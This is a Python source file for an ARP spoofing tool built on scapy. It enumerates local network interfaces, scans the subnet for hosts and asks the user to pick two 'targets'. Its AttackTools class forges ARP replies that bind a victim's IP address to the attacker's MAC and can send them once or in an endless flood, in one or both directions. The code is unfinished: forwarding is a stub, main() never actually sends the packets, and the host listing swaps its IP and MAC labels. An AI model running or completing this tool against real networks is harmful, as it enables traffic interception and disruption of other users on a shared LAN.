import scapy.layers.l2
from scapy.all import *
import netifaces
from math import log


class Interface:
    def __init__(self, name, netmask, addr, hwaddr):
        self.name = name
        self.netmask = netmask
        self.addr = addr
        self.hwaddr = hwaddr
        self.host = Host(addr, hwaddr)

    def get_name(self):
        return self.name

    def get_netmask(self):
        return self.netmask

    def get_addr(self):
        return self.addr

    def get_hwaddr(self):
        return self.hwaddr

    def get_host(self):
        return self.host


class Host:
    def __init__(self, addr, hwaddr):
        self.addr = addr
        self.hwaddr = hwaddr

    def get_addr(self):
        return self.addr

    def get_hwaddr(self):
        return self.hwaddr


class NetworkRecon:
    @staticmethod
    def list_interfaces():
        # ID for the IP address information on this system
        inet_id = netifaces.AF_INET
        link_id = netifaces.AF_LINK

        interfaces = []
        for interface_name in sorted(netifaces.interfaces()):
            int_ip_data = netifaces.ifaddresses(interface_name)
            hw_data = netifaces.ifaddresses(interface_name)

            try:
                inet_values = int_ip_data[inet_id][0]
                hw_values = hw_data[link_id][0]
            except TypeError:
                continue
            except KeyError:
                continue

            netmask = inet_values.get("netmask")
            addr = inet_values.get("addr")
            hwaddr = hw_values.get("addr")

            iface = Interface(interface_name, netmask, addr, hwaddr)

            interfaces.append(iface)

        return interfaces

    @staticmethod
    def list_hosts(interface: Interface):
        netmask = interface.get_netmask().split(".")
        ip = interface.get_addr().split(".")

        ip = [int(x) for x in ip]

        # TODO: This is bad, make not bad
        if ip[3] != 0:
            ip[3] = ip[3] - 1

        elif ip[2] != 0:
            ip[3] = 255
            ip[2] = ip[2] - 1

        elif ip[1] != 0:
            ip[3] = 255
            ip[2] = 255
            ip[1] = ip[1] - 1

        elif ip[0] != 0:
            ip[3] = 255
            ip[2] = 255
            ip[1] = 255
            ip[0] = ip[0] - 1

        ip_str = ""

        for segment in ip:
            ip_str = ip_str + str(segment) + "."

        ip_str = ip_str[:-1]

        cidr = 0
        for portion in netmask:
            cidr = cidr + log(int(portion) + 1, 2)

        cidr = str(int(cidr))

        cidr_full = ip_str + "/" + cidr

        conf.iface = interface.get_name()
        tmp = scapy.layers.l2.arping(cidr_full)

        print()

        host_list = []

        for item in tmp[0]:
            tmpHost = Host(item[0].pdst, item[1].src)
            host_list.append(tmpHost)

        return host_list


class CommandLineInterface:
    @staticmethod
    def interface_selector():
        # TODO: Add error detection
        interfaces = NetworkRecon.list_interfaces()
        print("Available interfaces:")
        i = 0
        for interface in interfaces:
            print(str(i) + ": " + interface.name)
            i = i + 1

        print("")

        selected_interface_id = input("Please choose a network interface: ")

        print("")

        try:
            selected_interface_id = int(selected_interface_id)
            selected_interface = interfaces[selected_interface_id]

        except ValueError:
            i = 0
            for interface in interfaces:
                if interface.name == selected_interface_id:
                    selected_interface = interfaces[i]
                    break
                i = i + 1

        return selected_interface

    @staticmethod
    def host_selector(interface: Interface):
        # TODO: Add error detection
        hosts = NetworkRecon.list_hosts(interface)
        print("Available hosts:")
        i = 0
        for host in hosts:
            print("host " + str(i) + " ip: " + host.get_hwaddr() + ", mac: " + host.get_addr())
            i = i + 1

        print()

        target_1_id = input("Please select target #1: ")
        target_2_id = input("Please select target #2: ")

        target_1 = hosts[int(target_1_id)]
        target_2 = hosts[int(target_2_id)]

        selected_hosts = [target_1, target_2]

        return selected_hosts


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        ether_index = 0
        arp_index = 1

        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison_single(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
        # TODO: Add error detection
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2)

        if forwarding:
            # TODO: Implement packet forwarding
            pass

        # TODO: Add flood condition
        if flood and bidirectional:
            while True:
                sendp(arp1)
                sendp(arp2)

        elif flood:
            while True:
                sendp(arp1)


def main():
    print("This is an ARP Spoofing tool.\n")
    selected_interface = CommandLineInterface.interface_selector()
    targets = CommandLineInterface.host_selector(selected_interface)
    AttackTools.build_arp_response(selected_interface.get_host(), targets[0], targets[1])


main()
